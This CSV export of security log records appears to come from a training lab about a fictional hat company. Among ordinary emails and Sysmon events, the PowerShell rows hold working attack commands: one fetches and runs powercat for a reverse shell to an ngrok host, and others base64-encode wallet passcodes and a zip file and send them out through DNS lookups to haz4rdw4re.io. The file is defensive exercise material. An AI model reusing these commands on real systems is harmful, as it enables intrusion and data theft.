"_id","_ignored","_index","_score",attachment,content,datasource,direction,"dns.answers.data","dns.question.name","dns.resolved_ip","event.action","event.code","file.path","host.name",message,"network.protocol","powershell.command.invocation_details.value","powershell.command.name","powershell.file.script_block_text","process.command_line","process.name","process.parent.name","process.parent.pid","process.pid","process.working_directory",recipient,"registry.key","registry.path","registry.value",sender,subject,timestamp,"winlog.process.pid"
"YXV-ypsB8mE-0EyZh3_q","-",logs,"-","forceupdate.ps1","Michelle, here's the updated script. This version should work better - just run it when you get a chance.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","yani.zubair@tryhatme.com","Force update fix","Jan 17, 2026 @ 02:47:10.304","-"
"YHV-ypsB8mE-0EyZgH8B","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3456","-","-","-","-","-","C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:276824072 WinX:0 WinY:0 IEFrame:0000000000000000","rundll32.exe","iexplore.exe",3937,3829,"C:\Users\safa.prince\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:46:38.304","-"
"XnV9ypsB8mE-0EyZ1H8m","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3450","-","-","-","-","-","-","spoolsv.exe","-","-",3824,"-","-","System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0003\DriverVersion","HKLM\System\CurrentControlSet\Control\Class\{1ed2bbf9-11f0-4084-b21f-ad83a8e6dcdc}\0003\DriverVersion",DriverVersion,"-","-","Jan 17, 2026 @ 02:46:36.304","-"
"X3V-ypsB8mE-0EyZUX9U","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3452","-","-","-","-","-","-","-","-","-",3764,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{1E7F5481-8BCC-4426-B671-08BCD04848A0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{1E7F5481-8BCC-4426-B671-08BCD04848A0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:46:36.304","-"
"XXV9ypsB8mE-0EyZ0H9X","-",logs,"-",None," Will there be a recording available for those unable to attend live",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","cain.omoore@tryhatme.com","-","-","-","osman@stylewatchjournal.com","RE: RE: Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:46:22.304","-"
"W3V9ypsB8mE-0EyZen9x","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3449","-","-","-","-","-","""C:\Program Files\Internet Explorer\iexplore.exe"" -startmanager -Embedding","iexplore.exe","-",3987,3903,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:46:19.304","-"
"XHV9ypsB8mE-0EyZgn8d","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3452","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3968,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:45:56.304","-"
"WnV9ypsB8mE-0EyZXn_2","-",logs,"-",None,"This is getting ridiculous—why is this still unresolved?",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","sophie.j@tryhatme.com","-","-","-","sophie.j@tryhatme.com","RE: RE: Concerns over IHateHats.tech","Jan 17, 2026 @ 02:45:48.304","-"
"V3V8ypsB8mE-0EyZ_X9O","-",logs,"-",None," Travel through time and experience the evolution of hats from ancient Egypt to futuristic Mars Only 500 per ticket",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","josephine@gmail.com","Time Traveling Hat Adventure Explore Ancient Lands for Cheap","Jan 17, 2026 @ 02:45:41.304","-"
"VHV8ypsB8mE-0EyZyn-T","-",logs,"-",None," Thank you for the opportunity I confirm my availability and look forward to speaking with your team",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","duke@trendsettingtrilbies.com","-","-","-","invoice@tryhatme.com","RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:45:28.304","-"
"VnV8ypsB8mE-0EyZ7X_c","-",logs,"-",None," Please review and confirm availability for the proposed meeting time",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","day@stylishhatboutique.com","FWD: Scheduling a Virtual Meeting to Discuss Market Trends","Jan 17, 2026 @ 02:45:28.304","-"
"WHV9ypsB8mE-0EyZLH9c","-",logs,"-",None," The upcoming seminar will cover the latest innovations in hat manufacturing and design Secure your spot today",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","barker@hatcouturecompany.net","-","-","-","sophie.j@tryhatme.com","Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:45:18.304","-"
"WXV9ypsB8mE-0EyZMH8d","-",logs,"-",None," Here is a summary of our last discussion along with action items for the next steps Let us know if you have any modifications",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","duke@stylewatchjournal.com","-","-","-","roger.fedora@tryhatme.com","Follow-up on Previous Discussion: Next Steps for Engagement","Jan 17, 2026 @ 02:45:14.304","-"
"UnV8ypsB8mE-0EyZZX8D","-",logs,"-",None," Your feedback matters—take a few minutes to fill this out.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","michelle.smith@tryhatme.com","Hat-titude Check: Employee Feedback Survey","Jan 17, 2026 @ 02:45:06.304","-"
"VXV8ypsB8mE-0EyZyn-f","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3456","-","-","-","-","-","-","-","-","-",3878,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{49455221-FA52-47F9-826D-B41CFD35E447}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{49455221-FA52-47F9-826D-B41CFD35E447}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:44:49.304","-"
"U3V8ypsB8mE-0EyZm3_R","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3458","-","-","-","-","-","-","spoolsv.exe","-","-",3613,"-","-","System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{1E7F5481-8BCC-4426-B671-08BCD04848A0}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName","HKLM\System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{1E7F5481-8BCC-4426-B671-08BCD04848A0}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:44:37.304","-"
"UXV8ypsB8mE-0EyZZH_9","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3453","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3821,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:44:35.304","-"
"T3V7ypsB8mE-0EyZdn--","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3455","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3851,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:57.304","-"
"TnV7ypsB8mE-0EyZR3_1","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3453","-","-","-","-","-","-","spoolsv.exe","-","-",3888,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:43:43.304","-"
"TXV7ypsB8mE-0EyZLH96","-",logs,"-",None," Interviews set for next week. Check your calendars for slots.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","safa.prince@tryhatme.com","-","-","-","safa.prince@tryhatme.com","Hiring Update - Interview Schedule","Jan 17, 2026 @ 02:43:39.304","-"
"UHV7ypsB8mE-0EyZln8T","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3451","-","-","-","-","-","-","spoolsv.exe","-","-",3623,"-","-","System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{49455221-FA52-47F9-826D-B41CFD35E447}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName","HKLM\System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{49455221-FA52-47F9-826D-B41CFD35E447}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:43:33.304","-"
"R3V6ypsB8mE-0EyZ-X_A","-",logs,"-","-","-",sysmon,"-","172.16.1.10","DC-01.tryhatme.com","172.16.1.10","Dns query (rule: DnsQuery)",22,"-","win-3457","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3814,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:29.304","-"
"QnV6ypsB8mE-0EyZ2n-L","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""Process""] | Stop-Process. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=5741	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""Process""] | Stop-Process Details: CommandInvocation(Stop-Process): ""Stop-Process""ParameterBinding(Stop-Process): name=""InputObject""; value=""System.Diagnostics.Process (powershell)""","-","""Stop-Process"", ""System.Diagnostics.Process (powershell)""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:16.304","-"
"P3V6ypsB8mE-0EyZxn_p","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: . Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=5745	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine= Details: CommandInvocation(Out-Default): ""Out-Default""","-","""Out-Default""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:16.304","-"
"OHV6ypsB8mE-0EyZs39e","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,3648,"C:\Users\michael.ascot\downloads\","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"NHV6ypsB8mE-0EyZn3_T","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=483	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=59	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"N3V6ypsB8mE-0EyZr3-B","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\nslookup.exe"" VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm.haz4rdw4re.io","nslookup.exe","powershell.exe",3728,3700,"C:\Users\michael.ascot\downloads\","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"RnV6ypsB8mE-0EyZ-X-1","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=485	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=59	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"SnV7ypsB8mE-0EyZAX-K","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=487	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=59	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\BitcoinWalletPasscodes.txt"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Where-Object): ""Where-Object""ParameterBinding(Where-Object): name=""FilterScript""; value="" $_ -ne '' ""CommandInvocation(ForEach-Object): ""ForEach-Object""ParameterBinding(ForEach-Object): name=""Process""; value=""Invoke-Expression ""nslookup $_.haz4rdw4re.io""""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm""ParameterBinding(ForEach-Object): name=""InputObject""; value=""VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm""ParameterBinding(Where-Object): name=""InputObject""; value=""""ParameterBinding(Where-Object): name=""InputObject""; value=""RmYjEyNGZiMTY1NjZlfQ==""ParameterBinding(ForEach-Object): name=""InputObject""; value=""RmYjEyNGZiMTY1NjZlfQ==""ParameterBinding(Where-Object): name=""InputObject""; value=""""","-","""Where-Object"", "" $_ -ne '' "", ""ForEach-Object"", ""Invoke-Expression ""nslookup $_.haz4rdw4re.io"""", """", ""VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm"", ""VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm"", """", ""RmYjEyNGZiMTY1NjZlfQ=="", ""RmYjEyNGZiMTY1NjZlfQ=="", """"","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:43:07.304","-"
"THV7ypsB8mE-0EyZFX8j","-",logs,"-",None," I have checked my schedule and I will be attending Looking forward to meeting everyone and exchanging ideas",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","conor@yahoo.com","-","-","-","michael.ascot@tryhatme.com","RE: Invitation to a Business Networking Luncheon Next Week","Jan 17, 2026 @ 02:42:59.304","-"
"LXV6ypsB8mE-0EyZXX9t","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=459	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup HhlO5R8AAAAdAAAAHQAAAAAAAAAAAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"LnV6ypsB8mE-0EyZXX-A","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=449	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup 8KKEotTs0rSSzJzM8zMjAy1isoKKkA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup 8KKEotTs0rSSzJzM8zMjAy1isoKKkA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"KnV6ypsB8mE-0EyZTn8K","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=461	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AAAABbAAAASW52ZXN0b3JQcmVzZW50.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AAAABbAAAASW52ZXN0b3JQcmVzZW50.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"OnV6ypsB8mE-0EyZs3-F","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=463	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup YXRpb24yMDIzLnBwdHhQSwUGAAAAAA.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup YXRpb24yMDIzLnBwdHhQSwUGAAAAAA.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"NXV6ypsB8mE-0EyZn3_T","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=451	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup AFBLAQIUABQAAAAIANigLlfVU3cDIg.haz4rdw4re.io""","-","""Invoke-Expression"", ""nslookup AFBLAQIUABQAAAAIANigLlfVU3cDIg.haz4rdw4re.io""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:42:52.304","-"
"M3V6ypsB8mE-0EyZnH8O","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: $base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""}. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=465	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=cc1a6844-a4f9-4e73-98b9-9193fdb89041	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass	EngineVersion=5.1.20348.1366	RunspaceId=3c649a28-fde1-4e53-936b-e9e725bd8280	PipelineId=53	ScriptName=	CommandLine=$base64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(""C:\Users\michael.ascot\Downloads\exfiltration\exfilt8me.zip"")); $base64 -split '(.{1,30})' | Where-Object { $_ -ne '' } | ForEach-Object {Invoke-Expression ""nslookup $_.haz4rdw4re.io""} Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""ParameterBinding(Invoke-Expression): name=""Command""; value=""nslookup 